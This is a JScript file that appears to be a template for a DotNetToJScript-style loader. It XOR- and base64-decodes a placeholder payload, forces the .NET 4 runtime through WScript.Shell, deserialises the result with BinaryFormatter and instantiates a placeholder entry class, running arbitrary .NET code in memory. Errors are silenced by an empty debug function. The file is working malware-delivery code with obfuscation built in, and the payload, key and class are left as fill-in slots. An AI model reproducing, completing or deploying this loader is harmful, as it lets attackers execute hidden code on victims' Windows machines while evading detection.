function setversion() {
	new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
	}

	function xor(text, key) {
			  var encryptedText = "";
			  for (var i = 0; i < text.length; i++) {
				var textChar = text.charCodeAt(i);
				var encryptedChar = textChar ^ key;
				encryptedText += String.fromCharCode(encryptedChar);
			  }
			  return encryptedText;
	}

	function debug(s) {}
	function base64ToStream(b) {
		var enc = new ActiveXObject("System.Text.ASCIIEncoding");
		var length = enc.GetByteCount_2(b);
		var ba = enc.GetBytes_4(b);
		var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
		ba = transform.TransformFinalBlock(ba, 0, length);
		var ms = new ActiveXObject("System.IO.MemoryStream");
		ms.Write(ba, 0, (length / 4) * 3);
		ms.Position = 0;
		return ms;
	}

	decodeBase64 = function(s) {
		var e={},i,b=0,c,x,l=0,a,r='',w=String.fromCharCode,L=s.length;
		var A="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
		for(i=0;i<64;i++){e[A.charAt(i)]=i;}
		for(x=0;x<L;x++){
			c=e[s.charAt(x)];b=(b<<6)+c;l+=6;
			while(l>=8){((a=(b>>>(l-=8))&0xff)||(x<(L-2)))&&(r+=w(a));}
		}
		return r;
	};

	var serialized_obj = "%B64PAYLOAD%";
	var entry_class = '%ENTRYCLASS%';

try {
	setversion();
	var decodedPayload= xor(decodeBase64(serialized_obj),%KEY%);
	var stm = base64ToStream(decodedPayload);
	var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
	var al = new ActiveXObject('System.Collections.ArrayList');
	var d = fmt.Deserialize_2(stm);
	al.Add(undefined);
	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
	
} catch (e) {
    debug(e.message);
}